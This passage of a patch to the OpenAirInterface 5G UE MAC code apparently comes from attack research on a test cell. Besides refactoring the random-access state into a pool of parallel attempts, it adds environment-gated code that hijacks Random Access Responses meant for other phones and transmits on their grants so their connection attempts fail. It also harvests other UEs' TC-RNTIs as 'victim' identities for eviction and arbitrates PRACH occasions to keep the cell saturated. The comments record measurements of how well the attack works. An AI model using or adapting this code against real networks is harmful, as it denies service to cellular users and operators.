+@@ -249,13 +249,13 @@ static void config_dci_pdu(NR_UE_MAC_INST_t *mac,
+     case TYPE_RA_RNTI_:
+       // we use the initial DL BWP
+       sps = current_DL_BWP->cyclicprefix == NULL ? 14 : 12;
+-      rel15->rnti = mac->ra.ra_rnti;
++      rel15->rnti = mac->ra->ra_rnti;
+       rel15->SubcarrierSpacing = current_DL_BWP->scs;
+       break;
+     case TYPE_MSGB_RNTI_:
+       // we use the initial DL BWP
+       sps = current_DL_BWP->cyclicprefix == NULL ? 14 : 12;
+-      rel15->rnti = mac->ra.MsgB_rnti;
++      rel15->rnti = mac->ra->MsgB_rnti;
+       rel15->SubcarrierSpacing = current_DL_BWP->scs;
+       break;
+     case TYPE_P_RNTI_:
+@@ -268,7 +268,7 @@ static void config_dci_pdu(NR_UE_MAC_INST_t *mac,
+     case TYPE_TC_RNTI_:
+       // we use the initial DL BWP
+       sps = current_DL_BWP->cyclicprefix == NULL ? 14 : 12;
+-      rel15->rnti = mac->ra.t_crnti;
++      rel15->rnti = mac->ra->t_crnti;
+       rel15->SubcarrierSpacing = current_DL_BWP->scs;
+       break;
+     case TYPE_SP_CSI_RNTI_:
+@@ -567,7 +567,7 @@ void ue_dci_configuration(NR_UE_MAC_INST_t *mac, fapi_nr_dl_config_request_t *dl
+       config_dci_pdu(mac, dl_config, TYPE_SI_RNTI_, slot, ss);
+     }
+   }
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   if (mac->state == UE_PERFORMING_RA && ra->ra_state >= nrRA_WAIT_RAR) {
+     const NR_SearchSpace_t *ra_SS = get_common_search_space(mac, pdcch_config->ra_SS_id);
+     // if RA is ongoing use RA search space
+diff --git a/openair2/LAYER2/NR_MAC_UE/nr_ue_power_procedures.c b/openair2/LAYER2/NR_MAC_UE/nr_ue_power_procedures.c
+index 177ddf7..aca87aa 100644
+--- a/openair2/LAYER2/NR_MAC_UE/nr_ue_power_procedures.c
++++ b/openair2/LAYER2/NR_MAC_UE/nr_ue_power_procedures.c
+@@ -366,7 +366,7 @@ int16_t get_pucch_tx_power_ue(NR_UE_MAC_INST_t *mac,
+     if (mac->pucch_power_control_initialized == false) {
+       // Initialize power control state
+       // Assuming only sending on PCell
+-      NR_PRACH_RESOURCES_t *prach_res = &mac->ra.prach_resources;
++      NR_PRACH_RESOURCES_t *prach_res = &mac->ra->prach_resources;
+       float DELTA_P_rampup_requested = (prach_res->preamble_power_ramping_cnt - 1) * prach_res->preamble_power_ramping_step;
+       float DELTA_P_rampup = P_CMAX - (P_O_PUCCH + pathloss + delta_F_PUCCH + DELTA_TF + sum_delta_pucch);
+       DELTA_P_rampup = max(min(0, DELTA_P_rampup), DELTA_P_rampup_requested);
+@@ -465,7 +465,7 @@ int get_pusch_tx_power_ue(NR_UE_MAC_INST_t *mac,
+     if (current_UL_BWP->msg3_DeltaPreamble) {
+       DELTA_PREAMBLE_MSG3 = *current_UL_BWP->msg3_DeltaPreamble;
+     }
+-    int P_O_PRE = mac->ra.prach_resources.ra_preamble_rx_target_power;
++    int P_O_PRE = mac->ra->prach_resources.ra_preamble_rx_target_power;
+     P_O_NOMINAL_PUSCH = P_O_PRE + DELTA_PREAMBLE_MSG3;
+ 
+     if (has_pusch_power_control_config && pusch_Config->pusch_PowerControl->msg3_Alpha) {
+@@ -543,7 +543,7 @@ int get_pusch_tx_power_ue(NR_UE_MAC_INST_t *mac,
+     f_b_f_c = delta_pusch;
+   } else {
+     if (!mac->pusch_power_control_initialized && is_rar_tx_retx) {
+-      NR_PRACH_RESOURCES_t *prach_res = &mac->ra.prach_resources;
++      NR_PRACH_RESOURCES_t *prach_res = &mac->ra->prach_resources;
+       float DELTA_P_rampup_requested = (prach_res->preamble_power_ramping_cnt - 1) * prach_res->preamble_power_ramping_step;
+       float DELTA_P_rampup = P_CMAX - (P_O_PUSCH + M_pusch_component + alpha * pathloss + DELTA_TF + delta_pusch);
+       DELTA_P_rampup = min(DELTA_P_rampup_requested, max(0, DELTA_P_rampup));
+@@ -625,7 +625,7 @@ int get_srs_tx_power_ue(NR_UE_MAC_INST_t *mac,
+ 
+     if (!is_tpc_accumulation_provided && (!is_configured_for_pusch_on_current_bwp || separate_pc_adjustment_state)) {
+       if (!current_UL_BWP->srs_power_control_initialized) {
+-        NR_PRACH_RESOURCES_t *prach = &mac->ra.prach_resources;
++        NR_PRACH_RESOURCES_t *prach = &mac->ra->prach_resources;
+         float DELTA_P_rampup_requested = (prach->preamble_power_ramping_cnt - 1) * prach->preamble_power_ramping_step;
+         float DELTA_P_rampup = P_CMAX - (P_0_SRS + m_srs_component + alpha * pathloss);
+         DELTA_P_rampup = min(DELTA_P_rampup_requested, max(0, DELTA_P_rampup));
+diff --git a/openair2/LAYER2/NR_MAC_UE/nr_ue_procedures.c b/openair2/LAYER2/NR_MAC_UE/nr_ue_procedures.c
+index 8343db1..c715993 100644
+--- a/openair2/LAYER2/NR_MAC_UE/nr_ue_procedures.c
++++ b/openair2/LAYER2/NR_MAC_UE/nr_ue_procedures.c
+@@ -32,6 +32,32 @@
+ #include "common/utils/LOG/log.h"
+ #include "LAYER2/nr_rlc/nr_rlc_oai_api.h"
+ 
++extern bool nr_rss_is_probe(int ue);
++extern void nr_rss_note_own_crnti(int ue, unsigned crnti);
++extern void nr_rss_note_victim_crnti(unsigned crnti);
++
++/* RSS: take over RARs addressed to other UEs.
++   RA-RNTI is derived from the PRACH occasion, and every UE on this cell uses
++   the same occasion (slot 19, one FDM, measured), so every UE already decodes
++   every RAR - the stock code simply discards the ones whose RAPID is not its
++   own. Transmitting Msg3 on someone else's grant collides with that UE's Msg3,
++   so its contention resolution fails and its RA has to restart.
++   This is the first attack surface here that interferes with another UE's
++   procedure instead of consuming cell capacity: gate 3 (RRC admission) tops out
++   at 35.1% ceiling dwell and gate 1 (preamble flood) is unstable beyond one
++   instance, and in both cases a normal UE still connects on its first try.
++   Probe instances are excluded - they are the measurement, not the attack. */
++static bool rss_rar_hijack(void)
++{
++  static int cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_RAR_HIJACK");
++    cached = env ? (atoi(env) != 0) : 0;
++  }
++  return cached != 0;
++}
++
++
+ // #define DEBUG_MIB
+ // #define ENABLE_MAC_PAYLOAD_DEBUG 1
+ // #define DEBUG_RAR
+@@ -124,7 +150,7 @@ const initial_pucch_resource_t initial_pucch_resource[16] = {
+ 
+ int get_rnti_type(const NR_UE_MAC_INST_t *mac, const uint16_t rnti)
+ {
+-  const RA_config_t *ra = &mac->ra;
++  const RA_config_t *ra = mac->ra;
+   nr_rnti_type_t rnti_type;
+ 
+   if (rnti == ra->ra_rnti) {
+@@ -950,7 +976,7 @@ static int nr_ue_process_dci_dl_10(NR_UE_MAC_INST_t *mac,
+   } else {
+     dlsch_pdu->SubcarrierSpacing = current_DL_BWP->scs;
+     if (rnti_type == TYPE_RA_RNTI_) {
+-      if (nr_timer_is_active(&mac->ra.response_window_timer)) {
++      if (nr_timer_is_active(&mac->ra->response_window_timer)) {
+         dl_conf_req->pdu_type = FAPI_NR_DL_CONFIG_TYPE_RA_DLSCH;
+       } else {
+         // Discard the DCI
+@@ -3224,7 +3250,7 @@ static void set_time_alignment(NR_UE_MAC_INST_t *mac, int ta, ta_type_t type, in
+ static void handle_rar_reception(NR_UE_MAC_INST_t *mac, NR_MAC_RAR *rar, frame_t frame, int slot)
+ {
+   RAR_grant_t rar_grant;
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+ #ifdef DEBUG_RAR
+   // CSI
+   unsigned char csi_req = (unsigned char)(rar->UL_GRANT_4 & 0x01);
+@@ -3256,7 +3282,7 @@ static void handle_rar_reception(NR_UE_MAC_INST_t *mac, NR_MAC_RAR *rar, frame_t
+   if (!tda_info.valid_tda || tda_info.nrOfSymbols == 0) {
+     LOG_E(MAC, "Cannot schedule Msg3. Something wrong in TDA information\n");
+     // resume RAR response window timer if MSG2 decoding failed
+-    nr_timer_suspension(&mac->ra.response_window_timer);
++    nr_timer_suspension(&mac->ra->response_window_timer);
+     return;
+   }
+   frame_t frame_tx = 0;
+@@ -3390,7 +3416,19 @@ static void nr_ue_process_rar(NR_UE_MAC_INST_t *mac, nr_downlink_indication_t *d
+     return;
+   }
+ 
+-  RA_config_t *ra = &mac->ra;
++  /* RA pipelining: pick the slot this RAR belongs to, by the RAPID it carries.
++     The RA-RNTI cannot discriminate here: it derives from the occasion only,
++     and every attempt on this cell uses the same occasion (slot 19), so all
++     slots share one RA-RNTI. A RAPID that matches no live slot is dropped by
++     the existing mismatch branch below. No-op at ra_parallel 1. */
++  if (mac->ra_parallel > 1) {
++    const NR_RA_HEADER_RAPID *rapid_hdr =
++        (const NR_RA_HEADER_RAPID *)dl_info->rx_ind->rx_indication_body[pdu_id].pdsch_pdu.pdu;
++    int owner = rss_ra_by_rapid(mac, rapid_hdr->RAPID);
++    if (owner >= 0)
++      mac->ra = &mac->ra_pool[owner];
++  }
++  RA_config_t *ra = mac->ra;
+   ra->t_crnti = 0;
+   uint8_t n_subPDUs  = 0;  // number of RAR payloads
+   uint8_t n_subheaders = 0;  // number of MAC RAR subheaders
+@@ -3398,7 +3436,7 @@ static void nr_ue_process_rar(NR_UE_MAC_INST_t *mac, nr_downlink_indication_t *d
+   NR_RA_HEADER_RAPID *rarh = (NR_RA_HEADER_RAPID *) dlsch_buffer; // RAR subheader pointer
+   NR_MAC_RAR *rar = (NR_MAC_RAR *) (dlsch_buffer + 1);   // RAR subPDU pointer
+   uint8_t preamble_index = ra->ra_PreambleIndex;
+-  uint16_t rnti = mac->ra.ra_rnti;
++  uint16_t rnti = mac->ra->ra_rnti;
+ 
+   T(T_NRUE_MAC_DL_RAR_PDU_WITH_DATA, T_INT(rnti), T_INT(frame), T_INT(slot),
+     T_BUFFER(dlsch_buffer, dl_info->rx_ind->rx_indication_body[pdu_id].pdsch_pdu.pdu_length));
+@@ -3423,7 +3461,15 @@ static void nr_ue_process_rar(NR_UE_MAC_INST_t *mac, nr_downlink_indication_t *d
+         break;
+       }
+     }
+-    if (rarh->RAPID == preamble_index) {
++    const bool rss_steal = rss_rar_hijack() && !nr_rss_is_probe(mac->ue_id) && rarh->T == 1;
++    if (rarh->RAPID == preamble_index || rss_steal) {
++      if (rss_steal && rarh->RAPID != preamble_index) {
++        static unsigned long stolen;
++        if ((++stolen % 100) == 1)
++          LOG_W(NR_MAC, "[RSS] ue=%d hijacking RAR RAPID=%d (own %d), %lu so far\n",
++                mac->ue_id, rarh->RAPID, preamble_index, stolen);
++        ra->ra_PreambleIndex = rarh->RAPID; /* adopt it so the rest of the procedure lines up */
++      }
+       // The MAC entity may stop ra-ResponseWindow (and hence monitoring for Random Access Response(s)) after
+       // successful reception of a Random Access Response containing Random Access Preamble identifiers
+       // that matches the transmitted PREAMBLE_INDEX.
+@@ -3431,10 +3477,32 @@ static void nr_ue_process_rar(NR_UE_MAC_INST_t *mac, nr_downlink_indication_t *d
+       LOG_A(NR_MAC, "[UE %d][RAPROC][%d.%d] Found RAR with the intended RAPID %d\n", mac->ue_id, frame, slot, rarh->RAPID);
+       rar = (NR_MAC_RAR *) (dlsch_buffer + n_subheaders + (n_subPDUs - 1) * sizeof(NR_MAC_RAR));
+       handle_rar_reception(mac, rar, frame, slot);
++      /* Remember our own TC-RNTI so the eviction sweep can skip it. Read it
++         straight from the RAR body rather than from ra->t_crnti: that field is
++         not always set by the time we get here, and any TC-RNTI of ours that
++         misses the own-set gets harvested by our other instances as a victim.
++         Measured 2026-10-23 - with 4 harvesters at ~300 RA/s the ring filled
++         with 68 "victims" and the 155 aimed requests spread about 2 per
++         identity, so the real victim got nothing. */
++      {
++        const unsigned own_tc = (unsigned)(rar->TCRNTI_2 + (rar->TCRNTI_1 << 8));
++        if (own_tc)
++          nr_rss_note_own_crnti(mac->ue_id, own_tc);
++      }
++      if (ra->t_crnti)
++        nr_rss_note_own_crnti(mac->ue_id, (unsigned)ra->t_crnti);
+       if (ra->cfra)
+         nr_ra_succeeded(mac, frame, slot);
+       break;
+     }
++    if (rarh->RAPID != preamble_index) {
++      /* Someone else's RAR. Harvest the TC-RNTI the gNB just minted for them: on this
++         cell every UE shares the RA-RNTI, so this arrives for free and is exactly the
++         identity the eviction path needs. */
++      const NR_MAC_RAR *other = (const NR_MAC_RAR *)(dlsch_buffer + n_subheaders + (n_subPDUs - 1) * sizeof(NR_MAC_RAR));
++      nr_rss_note_victim_crnti((unsigned)(other->TCRNTI_2 + (other->TCRNTI_1 << 8)));
++    }
++
+     if (rarh->E == 0) {
+       LOG_W(NR_MAC,"[UE %d][RAPROC][%d.%d] Received RAR preamble (%d) doesn't match the intended RAPID (%d)\n",
+             mac->ue_id,
+@@ -3443,7 +3511,7 @@ static void nr_ue_process_rar(NR_UE_MAC_INST_t *mac, nr_downlink_indication_t *d
+             rarh->RAPID,
+             preamble_index);
+       // resume RAR response window timer if MSG2 decoding failed
+-      nr_timer_suspension(&mac->ra.response_window_timer);
++      nr_timer_suspension(&mac->ra->response_window_timer);
+       break;
+     } else {
+       rarh += sizeof(NR_MAC_RAR) + 1;
+@@ -3992,7 +4060,7 @@ static int nr_ue_validate_successrar(uint8_t *pduP, int32_t pdu_len, NR_UE_MAC_I
+   int n = 0;
+   uint8_t E = 1;
+   uint8_t cont_res_id[6];
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+   ra->RA_backoff_limit = 0;
+ 
+   while (n < pdu_len && E) {
+@@ -4109,7 +4177,7 @@ static void nr_ue_process_mac_pdu(NR_UE_MAC_INST_t *mac, nr_downlink_indication_
+   int32_t pdu_len = (int32_t)pdsch_pdu->pdu_length;
+   uint8_t CC_id = dl_info->cc_id;
+   uint8_t done = 0;
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+ 
+   if (!pduP) {
+     return;
+@@ -4259,6 +4327,18 @@ static void nr_ue_process_mac_pdu(NR_UE_MAC_INST_t *mac, nr_downlink_indication_
+                 pduP[5],
+                 pduP[6]);
+ 
++          /* RA pipelining: this Msg4 belongs to whichever slot sent the
++             matching contention resolution ID in its Msg3. Re-point before
++             stopping the timer, or we would stop another slot's. A PDU that
++             matches nothing falls through to the stock mismatch handling
++             below. No-op at ra_parallel 1. */
++          if (mac->ra_parallel > 1) {
++            int owner = rss_ra_by_contres(mac, &pduP[1]);
++            if (owner >= 0) {
++              mac->ra = &mac->ra_pool[owner];
++              ra = mac->ra;
++            }
++          }
+           nr_timer_stop(&ra->contention_resolution_timer);
+           bool ra_success = check_ra_contention_resolution(&pduP[1], ra->cont_res_id);
+ 
+diff --git a/openair2/LAYER2/NR_MAC_UE/nr_ue_scheduler.c b/openair2/LAYER2/NR_MAC_UE/nr_ue_scheduler.c
+index f101369..1a82f47 100644
+--- a/openair2/LAYER2/NR_MAC_UE/nr_ue_scheduler.c
++++ b/openair2/LAYER2/NR_MAC_UE/nr_ue_scheduler.c
+@@ -164,7 +164,7 @@ void handle_ulsync_loss(NR_UE_MAC_INST_t *mac)
+ 
+ void update_mac_dl_timers(NR_UE_MAC_INST_t *mac)
+ {
+-  bool ra_window_expired = nr_timer_tick(&mac->ra.response_window_timer);
++  bool ra_window_expired = nr_timer_tick(&mac->ra->response_window_timer);
+   if (ra_window_expired) // consider the Random Access Response reception not successful
+     nr_rar_not_successful(mac);
+   bool alignment_timer_expired = nr_timer_tick(&mac->time_alignment_timer);
+@@ -179,7 +179,7 @@ void update_mac_ul_timers(NR_UE_MAC_INST_t *mac)
+     if (inactivity_timer_expired)
+       nr_mac_rrc_inactivity_timer_ind(mac->ue_id);
+   }
+-  bool contention_resolution_expired = nr_timer_tick(&mac->ra.contention_resolution_timer);
++  bool contention_resolution_expired = nr_timer_tick(&mac->ra->contention_resolution_timer);
+   if (contention_resolution_expired)
+     nr_ra_contention_resolution_failed(mac);
+   for (int j = 0; j < NR_MAX_SR_ID; j++)
+@@ -225,20 +225,20 @@ void update_mac_ul_timers(NR_UE_MAC_INST_t *mac)
+       phr_info->phr_reporting |= (1 << phr_cause_periodic_timer);
+     }
+   }
+-  bool ra_backoff_expired = nr_timer_tick(&mac->ra.RA_backoff_timer);
++  bool ra_backoff_expired = nr_timer_tick(&mac->ra->RA_backoff_timer);
+   if (ra_backoff_expired) {
+     // perform the Random Access Resource selection procedure after the backoff time
+-    mac->ra.ra_state = nrRA_GENERATE_PREAMBLE;
++    mac->ra->ra_state = nrRA_GENERATE_PREAMBLE;
+     ra_resource_selection(mac);
+   } else {
+-    if (nr_timer_is_active(&mac->ra.RA_backoff_timer)) {
++    if (nr_timer_is_active(&mac->ra->RA_backoff_timer)) {
+       // if the criteria (as defined in clause 5.1.2) to select contention-free Random Access Resources
+       // is met during the backoff time
+       // TODO verify what does this mean
+-      if (mac->ra.cfra) {
++      if (mac->ra->cfra) {
+         // perform the Random Access Resource selection procedure
+-        nr_timer_stop(&mac->ra.RA_backoff_timer);
+-        mac->ra.ra_state = nrRA_GENERATE_PREAMBLE;
++        nr_timer_stop(&mac->ra->RA_backoff_timer);
++        mac->ra->ra_state = nrRA_GENERATE_PREAMBLE;
+         ra_resource_selection(mac);
+       }
+     }
+@@ -378,9 +378,9 @@ int nr_config_pusch_pdu(NR_UE_MAC_INST_t *mac,
+   int dmrslength = 1;
+   NR_PUSCH_Config_t *pusch_Config = current_UL_BWP->pusch_Config;
+ 
+-  AssertFatal(!((mac->ra.ra_state < nrRA_SUCCEEDED && mac->ra.ra_type == RA_2_STEP) && rar_grant), "logic error: Is not possible to have both msgA_pusch_resource and rar_grant\n");
++  AssertFatal(!((mac->ra->ra_state < nrRA_SUCCEEDED && mac->ra->ra_type == RA_2_STEP) && rar_grant), "logic error: Is not possible to have both msgA_pusch_resource and rar_grant\n");
+ 
+-  if (mac->ra.ra_state < nrRA_SUCCEEDED && mac->ra.ra_type == RA_2_STEP) {
++  if (mac->ra->ra_state < nrRA_SUCCEEDED && mac->ra->ra_type == RA_2_STEP) {
+     NR_MsgA_PUSCH_Resource_r16_t *msgA_PUSCH_Resource =
+         current_UL_BWP->msgA_ConfigCommon_r16->msgA_PUSCH_Config_r16->msgA_PUSCH_ResourceGroupA_r16;
+     int S = 0;
+@@ -1433,7 +1433,7 @@ static void nr_update_sr(NR_UE_MAC_INST_t *mac, bool BSRsent)
+         mac->sr_fallback_ra_triggered = false;
+         sr->pending = true;
+         sr->counter = 0;
+-      } else if (!mac->sr_fallback_ra_triggered && !mac->ra.ra_pucch) {
++      } else if (!mac->sr_fallback_ra_triggered && !mac->ra->ra_pucch) {
+         // initiate a Random Access procedure on the SpCell and cancel the pending SR
+         // if the MAC entity has no valid PUCCH resource configured for the pending SR
+         // Wait until any pending Msg4/MsgB HARQ feedback PUCCH has been transmitted
+@@ -1532,13 +1532,135 @@ static bool is_prach_frame(frame_t frame, prach_occasion_info_t *prach_occasion_
+     return false;
+ }
+ 
++
++/* RSS: PRACH occasion arbitration.
++   Box-measured 2026-10-22: 35.3% of attempt starts land within 1 ms of another,
++   even though the instances' cycle phases are already uniformly random
++   (circular concentration R = 0.01, cycle p50 69.3 ms, CV 0.5-0.6). The
++   clumping is not phase locking, it is the occasion grid: this cell offers one
++   RO per frame (slot 19, one FDM, confirmed in the UE log), so every instance
++   that is ready in a frame transmits in that same occasion and the following
++   occasions go unused.
++   Creations matter because releases are their 2.0 s delayed copy (cross
++   correlation r = +0.99 at lag 2000 ms, context lifetime 1999.4 +- 0.3 ms).
++   Release clumping sets how far occupancy drains below the cell ceiling
++   (releases-in-gap -> depth r = +0.60) and depth sets the reject gap
++   (36 ms per slot). So clumped creations are what produce the long gaps.
++   Spreading creations onto the 10 ms grid needs only ~45% occasion duty
++   (one creation per 22.3 ms at the 44.9/s the ceiling needs), so there is room.
++   Radio write timestamps are left alone: rewriting them is what broke the
++   refuted RSS_PHASE_STAGGER against the late-drop guard in nr-ue-ru.c. */
++static pthread_mutex_t rss_ro_mtx = PTHREAD_MUTEX_INITIALIZER;
++static frame_t rss_ro_frame;
++static int rss_ro_slot = -1;
++static int rss_ro_owner = -1;
++static unsigned long rss_ro_granted, rss_ro_deferred, rss_ro_cooled;
++/* Per-instance cooldown. "One instance per occasion" still lets a single
++   instance take consecutive occasions, and it does: claims run at 158/s
++   against 100 occasions/s (box-measured 2026-10-22), i.e. PRACH is retried
++   ~2.5x per successful attempt. Those retries re-clump the creations the
++   arbitration just spread. Holding an instance off for N frames after it is
++   granted forces the instances to rotate through the grid instead. */
++#define RSS_RO_MAX_UE 16
++static int rss_ro_last[RSS_RO_MAX_UE];
++static bool rss_ro_last_set[RSS_RO_MAX_UE];
++
++static bool rss_ro_arbitrate(void)
++{
++  static int cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_RO_ARBITRATE");
++    cached = env ? (atoi(env) != 0) : 0;
++  }
++  return cached != 0;
++}
++
++/* Deterministic round robin: instance i may only use occasions where
++   frame % N == i % N, so consecutive creations land exactly one occasion
++   (10 ms) apart instead of piling into whichever frame comes next.
++   Box-measured 2026-10-22: first-come arbitration alone leaves 643-765 ms
++   below the ceiling, because a deferred instance simply retries in the very
++   next frame -- the clump moves, it does not spread. Per-instance cooldown was
++   refuted (765 / 1254 / 937 ms at N = 0 / 4 / 6) because the deferrals are
++   cross-instance collisions, not one instance repeating: at cooldown 2 the
++   counter never fired at all.
++   Capacity check: grants run at 61.7/s against 100 occasions/s, so each of 6
++   instances takes 10.3/s while round robin allows 16.7/s. No throttling.
++   0 = off; otherwise set it to the instance count. */
++static int rss_ro_rr(void)
++{
++  static int cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_RO_RR");
++    cached = env ? atoi(env) : 0;
++    if (cached < 0)
++      cached = 0;
++  }
++  return cached;
++}
++
++/* Frames an instance must skip after it is granted an occasion. 0 = off. */
++static int rss_ro_cooldown(void)
++{
++  static int cached = -1;
++  if (cached < 0) {
++    const char *env = getenv("RSS_RO_COOLDOWN");
++    cached = env ? atoi(env) : 0;
++    if (cached < 0)
++      cached = 0;
++  }
++  return cached;
++}
++
++/* true = this instance may use the occasion at (frame, slot). */
++static bool rss_ro_claim(int ue, frame_t frame, int slot)
++{
++  if (!rss_ro_arbitrate())
++    return true;
++  const int rr = rss_ro_rr();
++  if (rr > 0 && ((int)frame % rr) != (ue % rr)) {
++    pthread_mutex_lock(&rss_ro_mtx);
++    rss_ro_cooled++;
++    pthread_mutex_unlock(&rss_ro_mtx);
++    return false; /* not this instance's occasion */
++  }
++  bool mine;
++  const int cool = rss_ro_cooldown();
++  const int u = (ue >= 0 && ue < RSS_RO_MAX_UE) ? ue : 0;
++  pthread_mutex_lock(&rss_ro_mtx);
++  if (rss_ro_slot == slot && rss_ro_frame == frame) {
++    mine = (rss_ro_owner == ue); /* occasion already claimed this frame */
++    if (!mine)
++      rss_ro_deferred++;
++  } else if (cool > 0 && rss_ro_last_set[u] && ((int)frame - rss_ro_last[u] + 1024) % 1024 < cool) {
++    mine = false; /* this instance is still cooling down */
++    rss_ro_cooled++;
++  } else {
++    rss_ro_frame = frame;
++    rss_ro_slot = slot;
++    rss_ro_owner = ue;
++    rss_ro_last[u] = (int)frame;
++    rss_ro_last_set[u] = true;
++    mine = true;
++  }
++  if (mine)
++    rss_ro_granted++;
++  const unsigned long tot = rss_ro_granted + rss_ro_deferred + rss_ro_cooled;
++  if ((tot % 500) == 0)
++    LOG_I(NR_MAC,
++          "[RSS] RO arbitration: %lu granted, %lu deferred, %lu skipped (cooldown %d, rr %d)\n",
++          rss_ro_granted, rss_ro_deferred, rss_ro_cooled, cool, rss_ro_rr());
++  pthread_mutex_unlock(&rss_ro_mtx);
++  return mine;
++}
++
+ // This function schedules the PRACH according to prach_ConfigurationIndex and TS 38.211, tables 6.3.3.2.x
+ // PRACH formats 9, 10, 11 are corresponding to dual PRACH format configurations A1/B1, A2/B2, A3/B3.
+ // - todo:
+ // - Partial configuration is actually already stored in (fapi_nr_prach_config_t) &mac->phy_config.config_req->prach_config
+ static void nr_ue_prach_scheduler(NR_UE_MAC_INST_t *mac, frame_t frameP, slot_t slotP)
+ {
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+ 
+   // Get any valid PRACH occasion in the current slot for the selected SSB index
+   prach_occasion_info_t *prach_occasion_info = &ra->sched_ro_info;
+@@ -1548,6 +1670,9 @@ static void nr_ue_prach_scheduler(NR_UE_MAC_INST_t *mac, frame_t frameP, slot_t
+ 
+   if (is_ul_slot(slotP, &mac->frame_structure)) {
+     if (slotP == prach_occasion_info->slot) {
++      /* RSS: at most one instance per occasion; the rest wait for the next one. */
++      if (!rss_ro_claim(mac->ue_id, frameP, slotP))
++        return;
+       fapi_nr_ul_config_request_pdu_t *pdu = lockGet_ul_config(mac, frameP, slotP, FAPI_NR_UL_CONFIG_TYPE_PRACH);
+       if (!pdu) {
+         LOG_E(NR_MAC, "Error in PRACH allocation\n");
+@@ -1670,7 +1795,7 @@ static void nr_ue_prach_scheduler(NR_UE_MAC_INST_t *mac, frame_t frameP, slot_t
+                                       NULL,
+                                       NULL,
+                                       NULL,
+-                                      mac->ra.ra_rnti,
++                                      mac->ra->ra_rnti,
+                                       NR_SearchSpace__searchSpaceType_PR_common,
+                                       NR_DCI_NONE);
+ 
+@@ -1814,9 +1939,9 @@ static void nr_ue_pucch_scheduler(NR_UE_MAC_INST_t *mac, frame_t frame, int slot
+   PUCCH_sched_t pucch[3] = {0}; // TODO the size might change in the future in case of multiple SR or multiple CSI in a slot
+   int num_res = 0;
+ 
+-  if (mac->ra.ra_pucch) {
++  if (mac->ra->ra_pucch) {
+     // scheduling PUCCH prepared in advance for MSG4
+-    RA_PUCCH_SCHED_t *ra_pucch = mac->ra.ra_pucch;
++    RA_PUCCH_SCHED_t *ra_pucch = mac->ra->ra_pucch;
+     if (ra_pucch->sched_frame == frame && ra_pucch->sched_slot == slot) {
+       fapi_nr_ul_config_request_pdu_t *pdu = lockGet_ul_config(mac, frame, slot, FAPI_NR_UL_CONFIG_TYPE_PUCCH);
+       if (!pdu) {
+@@ -1824,7 +1949,7 @@ static void nr_ue_pucch_scheduler(NR_UE_MAC_INST_t *mac, frame_t frame, int slot
+         return;
+       }
+       pdu->pucch_config_pdu = ra_pucch->pucch_pdu;
+-      free_and_zero(mac->ra.ra_pucch);
++      free_and_zero(mac->ra->ra_pucch);
+       release_ul_config(pdu, false);
+       return;
+     }
+@@ -2565,7 +2690,7 @@ void nr_ue_ul_scheduler(NR_UE_MAC_INST_t *mac, nr_uplink_indication_t *ul_info)
+   int cc_id = ul_info->cc_id;
+   frame_t frame_tx = ul_info->frame;
+   slot_t slot_tx = ul_info->slot;
+-  RA_config_t *ra = &mac->ra;
++  RA_config_t *ra = mac->ra;
+ 
+   if (mac->state == UE_PERFORMING_RA && ra->ra_state == nrRA_UE_IDLE) {
+     init_RA(mac);
+diff --git a/openair2/NR_UE_PHY_INTERFACE/NR_IF_Module.c b/openair2/NR_UE_PHY_INTERFACE/NR_IF_Module.c
+index 2f9ef89..4093011 100644
+--- a/openair2/NR_UE_PHY_INTERFACE/NR_IF_Module.c
++++ b/openair2/NR_UE_PHY_INTERFACE/NR_IF_Module.c
+@@ -151,13 +151,13 @@ static nr_dci_format_t handle_dci(NR_UE_MAC_INST_t *mac, frame_t frame, int slot
+   // if notification of a reception of a PDCCH transmission of the SpCell is received from lower layers
+   // if the C-RNTI MAC CE was included in Msg3
+   // consider this Contention Resolution successful
+-  if (mac->msg3_C_RNTI && mac->ra.ra_state == nrRA_WAIT_CONTENTION_RESOLUTION)
++  if (mac->msg3_C_RNTI && mac->ra->ra_state == nrRA_WAIT_CONTENTION_RESOLUTION)
+     nr_ra_succeeded(mac, frame, slot);
+ 
+   // suspend RAR response window timer
+   // (in RFsim running multiple slot in parallel it might expire while decoding MSG2)
+-  if (mac->ra.ra_state == nrRA_WAIT_RAR)
+-    nr_timer_suspension(&mac->ra.response_window_timer);
++  if (mac->ra->ra_state == nrRA_WAIT_RAR)
++    nr_timer_suspension(&mac->ra->response_window_timer);
+ 
+   return nr_ue_process_dci_indication_pdu(mac, frame, slot, dci);
+ }
+@@ -192,7 +192,7 @@ static int8_t handle_pcch(NR_UE_MAC_INST_t *mac, nr_downlink_indication_t *dl_in
+ // Note: sdu should always be processed because data and timing advance updates are transmitted by the UE
+ static int8_t handle_dlsch(NR_UE_MAC_INST_t *mac, nr_downlink_indication_t *dl_info, int pdu_id)
+ {
+-  if (mac->ra.ra_state != nrRA_WAIT_RAR) // no HARQ for MSG2
++  if (mac->ra->ra_state != nrRA_WAIT_RAR) // no HARQ for MSG2
+     update_harq_status(mac,
+                        dl_info->rx_ind->rx_indication_body[pdu_id].pdsch_pdu.harq_pid,
+                        dl_info->rx_ind->rx_indication_body[pdu_id].pdsch_pdu.cw_idx,
+@@ -225,7 +225,7 @@ void update_harq_status(NR_UE_MAC_INST_t *mac, uint8_t harq_pid, int cw_idx, uin
+   if (current_harq->active) {
+     LOG_D(PHY,"Updating harq_status for harq_id %d, ack/nak %d\n", harq_pid, current_harq->ack);
+     // we can prepare feedback for MSG4 in advance
+-    if (mac->ra.ra_state == nrRA_WAIT_CONTENTION_RESOLUTION || mac->ra.ra_state == nrRA_WAIT_MSGB)
++    if (mac->ra->ra_state == nrRA_WAIT_CONTENTION_RESOLUTION || mac->ra->ra_state == nrRA_WAIT_MSGB)
+       prepare_msg4_msgb_feedback(mac, harq_pid, ack_nack);
+     else {
+       current_harq->ack = ack_nack;
+@@ -246,7 +246,7 @@ int nr_ue_ul_indication(nr_uplink_indication_t *ul_info)
+   AssertFatal(!ret, "mutex failed %d\n", ret);
